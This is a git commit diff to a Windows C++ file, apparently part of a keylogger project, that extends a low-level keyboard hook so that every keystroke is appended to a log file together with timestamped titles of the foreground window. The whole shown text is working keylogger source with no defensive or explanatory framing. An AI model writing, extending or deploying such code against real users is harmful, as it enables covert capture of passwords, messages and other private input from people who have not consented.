b036854bd9434f8abfb2e5c82bb95560aa35efb9
Zakariaa Oulhafiane <Zakariaa.Oulhafiane@gmail.com>
2022-06-15 09:10:13 -0700

    Detection and log keystrokes and title of foreground process finished

--- sources/winkey.cpp
+++ sources/winkey.cpp
@@ -1,8 +1,13 @@
 #pragma warning(disable:4530 4668 4577)
 
 #include <windows.h>
+#include <string.h>
+#include <stdio.h>
 
 #pragma comment(lib, "user32.lib")
+
+TCHAR wnd_title[1024] = { 0 };
+TCHAR old_wnd_title[1024] = { 0 };
 
 LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -12,12 +17,14 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 
 	switch (wParam) {
 	case WM_KEYDOWN:
-		HWND hForegoundProcess = GetForegroundWindow();
-		dwThreadID = GetWindowThreadProcessId(hForegoundProcess, &dwPID);
+		HWND hForegroundProcess = GetForegroundWindow();
+		dwThreadID = GetWindowThreadProcessId(hForegroundProcess, &dwPID);
 		HKL currentLocale = GetKeyboardLayout(dwThreadID);
 		WCHAR buffer[32];
-
+		TCHAR log_title[1500];
 		BYTE uKeyboardState[256] = { 0 };
+		SYSTEMTIME local_time;
+
 		GetKeyState(VK_SHIFT);
 		GetKeyState(VK_MENU);
 		GetKeyboardState(uKeyboardState);
@@ -34,6 +41,19 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 			NULL);
 		if (hFile != INVALID_HANDLE_VALUE) {
 			SetFilePointer(hFile, 0, NULL, FILE_END);
+
+			GetWindowTextA(hForegroundProcess, wnd_title, 1024);
+			if (strcmp(old_wnd_title, wnd_title) != 0) {
+				GetLocalTime(&local_time);
+				_snprintf_s(log_title, 1500, 1500, "\r\n[%02d.%02d.%04d %02d:%02d:%02d] - '%s'\r\n", local_time.wDay, local_time.wMonth, local_time.wYear, local_time.wHour, local_time.wMinute, local_time.wSecond, wnd_title);
+				strcpy_s(old_wnd_title, _countof(wnd_title), wnd_title);
+				WriteFile(
+					hFile,
+					log_title,
+					strlen(log_title),
+					&dwPtr,
+					NULL);
+			}
 
 			WriteFile(
 				hFile,
